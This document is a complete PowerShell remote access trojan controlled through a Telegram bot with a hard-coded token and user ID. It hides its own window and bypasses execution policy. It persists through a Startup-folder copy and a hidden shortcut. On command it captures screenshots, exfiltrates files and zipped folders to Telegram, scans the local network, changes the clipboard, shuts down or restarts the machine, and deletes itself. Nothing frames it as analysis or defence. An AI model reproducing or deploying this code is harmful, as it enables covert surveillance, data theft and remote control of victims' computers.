if (-not $env:PS_RUN_HIDDEN) {
    $env:PS_RUN_HIDDEN = "1"

    # Fallback: try to get current script path
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {
        # Not run from a script file. Maybe pipelined? Try to reconstruct path.
        $scriptPath = "$PSScriptRoot\$($MyInvocation.InvocationName)"
    }

    # Fallback if still empty (e.g., piped script, dot-sourced, etc.)
    if (-not (Test-Path $scriptPath)) {
        $scriptPath = "$env:TEMP\__temp_$(Get-Random).ps1"
        [System.IO.File]::WriteAllText($scriptPath, $MyInvocation.Line)
    }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
    $psi.WindowStyle = 'Hidden'
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}

# Telegram-Controlled PowerShell Script
$botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
$userId = "5036966807"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastUpdateId = 0 

function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$message
    )
    Invoke-RestMethod "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{
        chat_id = $chatId
        text = $message
    } | ConvertTo-Json -Depth 10)
}

function Send-TelegramFile {
    param (
        [string]$chatId,
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        return "File not found: $filePath"
    }

    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)

        $content = (
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n" +
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
            "Content-Type: application/octet-stream`r`n`r`n"
        )

        $footer = "`r`n--$boundary--`r`n"

        $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

        $bodyBytes = New-Object byte[] ($contentBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($contentBytes, 0, $bodyBytes, 0, $contentBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $bodyBytes, $contentBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $contentBytes.Length + $fileBytes.Length, $footerBytes.Length)

        Invoke-RestMethod -Uri "$apiUrl/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
        return "File sent: $filePath"
    } catch {
        return "Error sending file: $_"
    }
}

function Get-LocalIP {
    $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
    return $ipInfo.IPAddress -join ' '
}

function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
        return $publicIP.ip
    } catch {
        return "Unable to retrieve public IP."
    }
}

function Send-Screenshot {
    param (
        [string]$chatId
    )
    try {
        # Create temp file for screenshot
        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"

        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        # Capture screenshot
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)

        # Save screenshot
        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()

        # Send screenshot via Telegram
        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
        $fileContentBase64 = [Convert]::ToBase64String($fileContent)

        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"$LF",
            "$chatId",
            "--$boundary",
            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
            "Content-Type: image/png$LF",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
            "--$boundary--$LF"
        ) -join $LF

        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines

        # Clean up
        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
        return $true
    }
    catch {
        return $false
    }
}

function Get-PCName {
    return $env:COMPUTERNAME
}

function Send-TelegramFolder {
    param (
        [string]$chatId,
        [string]$folderPath
    )

    if (-not (Test-Path $folderPath -PathType Container)) {
        return "Folder not found: $folderPath"
    }

    try {
        $zipPath = "$env:TEMP\$(Split-Path $folderPath -Leaf)_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
        Compress-Archive -Path $folderPath -DestinationPath $zipPath -Force
        $result = Send-TelegramFile -chatId $chatId -filePath $zipPath
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        return $result
    } catch {
        return "Error zipping/sending folder: $_"
    }
}

function Send-HelpMessage {
    param ([string]$chatId)
    $helpMessage = @"
Available Commands:

/help - Displays this help message.
/notepad - Opens Notepad.
/visit <url> - Opens a URL in the browser.
/lock - Locks workstation.
/restart - Restarts the computer.
/shutdown - Shuts down the computer.
/ip - Shows local and public IP.
/screenshot - Sends a screenshot.
/pcname - Shows the computer name.
/sendfile <path> - Sends a file from local disk.
/sendfolder <path> - Sends a zipped folder from local disk.
/clipboard <text> - Sets the clipboard text.
/scannetwork - Scans the local network for active hosts.
/selfdestruct - Deletes this script file.
cd <path> - Change directory.
cd - Show current directory.
ls or dir - List files and folders.
"@
    Send-TelegramMessage -chatId $chatId -message $helpMessage
}

function Set-ClipboardText {
    param ([string]$text)
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Clipboard]::SetText($text)
    return "Clipboard set to: '$text'"
}

function Scan-LocalNetwork {
    $localIP = Get-LocalIP
    if (-not $localIP) {
        return "Could not determine local IP address."
    }
    $ipParts = $localIP.Split('.')
    $networkBase = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])."
    $activeHosts = @()

    foreach ($i in 1..254) {
        $targetIP = $networkBase + $i
        $ping = New-Object System.Net.NetworkInformation.Ping
        $reply = $ping.Send($targetIP, 100) # Timeout of 100 milliseconds

        if ($reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success) {
            try {
                $hostname = ([System.Net.Dns]::GetHostEntry($targetIP)).HostName
            } catch {
                $hostname = "N/A"
            }
            $activeHosts += "$targetIP ($hostname)"
        }
    }

    if ($activeHosts.Count -gt 0) {
        return "Active hosts on the network:`n" + ($activeHosts -join "`n")
    } else {
        return "No active hosts found on the network."
    }
}

function Self-Destruct {
    try {
        # Try to get the script path using $PSCommandPath
        $scriptPath = $PSCommandPath
        if (-not $scriptPath) {
            # Fallback to $MyInvocation.MyCommand.Path if $PSCommandPath is null
            $scriptPath = $MyInvocation.MyCommand.Path
        }

        if ($scriptPath) {
            # Delete the script file
            Remove-Item $scriptPath -Force

            # Construct the path to the shortcut in the Startup folder
            $scriptName = [System.IO.Path]::GetFileName($scriptPath)
            $startupFolder = [System.Environment]::GetFolderPath('Startup')
            $shortcutPath = [System.IO.Path]::Combine($startupFolder, "$scriptName.lnk")

            # Delete the shortcut file if it exists
            if (Test-Path $shortcutPath) {
                Remove-Item $shortcutPath -Force
                $selfDestructMessage = "Self-destruct initiated. Script and startup shortcut deleted."
            } else {
                $selfDestructMessage = "Self-destruct initiated. Script deleted. Startup shortcut not found."
            }
            return $selfDestructMessage
        } else {
            return "Error: Could not determine script path for self-destruct."
        }
    } catch {
        return "Error during self-destruct: $_"
    }
}

Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"

$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$destinationPath = Join-Path $startupFolder $scriptName
if (-not (Test-Path $destinationPath)) {
    Copy-Item -Path $scriptPath -Destination $destinationPath
}

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File `"$destinationPath`""
$shortcut.Save()

while ($true) {
    try {
        $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $chatId = $update.message.chat.id
            $text = $update.message.text.Trim()

            if ($chatId -ne $userId) { continue }

            if (-not $global:CurrentDirectory) {
                $global:CurrentDirectory = (Get-Location).Path
            }

            if ($text -match "^cd\s+(.*)") {
                $targetPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
                }
                if (Test-Path $targetPath -PathType Container) {
                    $global:CurrentDirectory = (Resolve-Path $targetPath).Path
                    $reply = "Changed directory to: $global:CurrentDirectory"
                } else {
                    $reply = "Directory not found: $targetPath"
                }
            }
            elseif ($text -match "^cd$") {
                $reply = "Current directory: $global:CurrentDirectory"
            }
            elseif ($text -match "^(ls|dir)$") {
                try {
                    $items = Get-ChildItem -Path $global:CurrentDirectory | Select-Object Name
                    $reply = if ($items) {
                        "Files and folders in $global:CurrentDirectory:`n" + ($items.Name -join "`n")
                    } else {
                        "No files or folders found in $global:CurrentDirectory"
                    }
                } catch {
                    $reply = "Error reading directory: $_"
                }
            }
            elseif ($text -eq "/help") {
                Send-HelpMessage -chatId $chatId
                continue
            }
            elseif ($text -eq "/ip") {
                $localIP = Get-LocalIP
                $publicIP = Get-PublicIP
                $reply = "Local IP: $localIP`nPublic IP: $publicIP"
            }
            elseif ($text -eq "/pcname") {
                $pcName = Get-PCName
                $reply = "Computer Name: $pcName"
            }
            elseif ($text -eq "/notepad") {
                Start-Process notepad.exe
                $reply = "Notepad opened."
            }
            elseif ($text -match "^/visit\s+(http[s]?:\/\/.*)") {
                $url = $matches[1]
                [System.Diagnostics.Process]::Start($url)
                $reply = "Opened in browser: $url"
            }
            elseif ($text -eq "/lock") {
                rundll32.exe user32.dll,LockWorkStation
                $reply = "System locked."
            }
            elseif ($text -eq "/restart") {
                shutdown /r /t 0
                $reply = "Restarting system..."
            }
            elseif ($text -eq "/shutdown") {
                shutdown /s /t 0
                $reply = "Shutting down system..."
            }
            elseif ($text -eq "/screenshot") {
                $reply = "Taking screenshot..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $success = Send-Screenshot -chatId $chatId
                $reply = if ($success) { "Screenshot sent." } else { "Failed to capture screenshot." }
            }
            elseif ($text -match "^/sendfile\s+(.+)$") {
                $filePath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($filePath)) {
                    $filePath = Join-Path $global:CurrentDirectory $filePath
                }
                $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
            }
            elseif ($text -match "^/sendfolder\s+(.+)$") {
                $folderPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($folderPath)) {
                    $folderPath = Join-Path $global:CurrentDirectory $folderPath
                }
                $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
            }
            elseif ($text -match "^/clipboard\s+(.+)$") {
                $clipboardText = $matches[1]
                $reply = Set-ClipboardText -text $clipboardText
            }
            elseif ($text -eq "/scannetwork") {
                $reply = "Scanning network..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $scanResult = Scan-LocalNetwork
                Send-TelegramMessage -chatId $chatId -message $scanResult
                continue # Don't send another reply immediately
            }
            elseif ($text -eq "/selfdestruct") {
                $reply = "Initiating self-destruct..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $selfDestructResult = Self-Destruct
                Send-TelegramMessage -chatId $chatId -message $selfDestructResult
                break # Exit the loop after self-destruct
            }
            else {
                $reply = "Unknown command."
            }

            Send-TelegramMessage -chatId $chatId -message $reply
        }
        Start-Sleep -Seconds 2
    } catch {
        Start-Sleep -Seconds 5
    }
}
